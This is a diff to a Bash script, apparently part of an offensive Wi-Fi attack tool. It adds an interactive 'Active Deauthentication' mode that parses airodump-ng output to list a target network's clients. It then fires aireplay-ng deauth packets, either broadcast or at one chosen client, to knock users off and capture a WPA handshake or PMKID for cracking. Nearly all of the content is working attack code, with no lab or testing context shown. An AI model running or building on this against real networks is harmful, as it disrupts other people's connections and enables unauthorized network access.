@@ -183,8 +183,77 @@ run_wifi_recon() {
     echo -e "${TXT_VOID}║   ${TXT_RED_LASER}Channel: ${sel_ch} | Active Clients Detected: ${sel_stas} | Capturing PMKID / WPA Handshake (90s)...${NC}"
 
     iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1
+
+    echo -e "${TXT_VOID}│${NC}"
+    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ ? ] Select Interception Strategy:${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[1] Passive Monitoring${NC} (Wait 90s for natural re-auth)"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[2] Active Deauthentication${NC} (Inject Aireplay-ng Deauth)"
+    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Strategy [1-2] (Default: 1): ${NC}"
+    read -r strat_choice
+
+    local target_stations=()
+    local parsing_stations=0
+
+    while IFS=, read -r col1 col2 col3 col4 col5 col6 col7; do
+        col1=$(echo "$col1" | xargs)
+        col6=$(echo "$col6" | xargs)
+
+        if [[ "$col1" == "Station MAC" ]]; then
+            parsing_stations=1
+            continue
+        fi
+
+        if [ $parsing_stations -eq 1 ]; then
+            if [[ "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ "$col6" == "$sel_bssid" ]]; then
+                target_stations+=("$col1")
+            fi
+        fi
+    done < "$csv_file"
+
     airodump-ng --bssid "$sel_bssid" --channel "$sel_ch" --write "$capture_out" "$iface" >/dev/null 2>&1 &
     local cap_pid=$!
+
+    if [[ "$strat_choice" == "2" ]]; then
+        echo -e "${TXT_VOID}│${NC}"
+        if [ ${#target_stations[@]} -gt 0 ]; then
+            echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// SELECTIVE DEAUTH MATRIX ]${TXT_VOID}───────────────────────────────────────╢${NC}"
+            local st_idx=1
+            for sta in "${target_stations[@]}"; do
+                local formatted_st_num=$(printf "%02d" $st_idx)
+                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[${formatted_st_num}]${NC} Target Station: ${TXT_RED_SUPERNOVA}${sta}${NC}"
+                ((st_idx++))
+            done
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[0] Broadcast Deauth${NC} (Target all stations simultaneously)"
+            echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────╢${NC}"
+            echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Select Station Index [0-$((st_idx-1))] (Default: 0): ${NC}"
+            read -r sta_choice
+
+            local deauth_target=""
+            if [[ "$sta_choice" =~ ^[1-9][0-9]*$ ]] && [ "$sta_choice" -le ${#target_stations[@]} ]; then
+                deauth_target="${target_stations[$((sta_choice-1))]}"
+                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[ * ] TARGET LOCK STAGED FOR SPECIFIC CLIENT: ${TXT_B_ALARM}${deauth_target}${NC}"
+            else
+                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[ * ] TARGET LOCK STAGED FOR BROADCAST DEAUTH${NC}"
+            fi
+        else
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] WARNING: No active clients in CSV cache. Defaulting to Broadcast.${NC}"
+            local deauth_target=""
+        fi
+
+        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_ALARM}[ * ] FIRING DEAUTH IMPULSES VIA AIREPLAY-NG...${NC}"
+        if [ -n "$deauth_target" ]; then
+            aireplay-ng -0 7 -a "$sel_bssid" -c "$deauth_target" "$iface" >/dev/null 2>&1 &
+        else
+            aireplay-ng -0 7 -a "$sel_bssid" "$iface" >/dev/null 2>&1 &
+        fi
+        local deauth_pid=$!
+        wait "$deauth_pid" 2>/dev/null
+        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ + ] Injection cycle complete. Awaiting handshake catch...${NC}"
+    fi
+
+    echo -e "${TXT_VOID}│${NC}"
+    echo -e "${TXT_VOID}╟─${TXT_RED_PLASMA}[ * ] LOCKING SYNAPTIC DRILL ON TARGET:${NC} ${TXT_RED_SUPERNOVA}${sel_essid}${NC} (${TXT_B_ALARM}${sel_bssid}${NC})"
+    echo -e "${TXT_VOID}║   ${TXT_RED_LASER}Channel: ${sel_ch} | Monitoring for PMKID / WPA Handshake (90s)...${NC}"
 
     for ((i=90; i>0; i--)); do
         echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] DRAIN IN PROGRESS${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}HANDSHAKE_PULL${TXT_VOID}]${NC} ${TXT_RED_ALARM}REMAINING:${NC} ${TXT_RED_SUPERNOVA}${i}s${NC}\033[K"
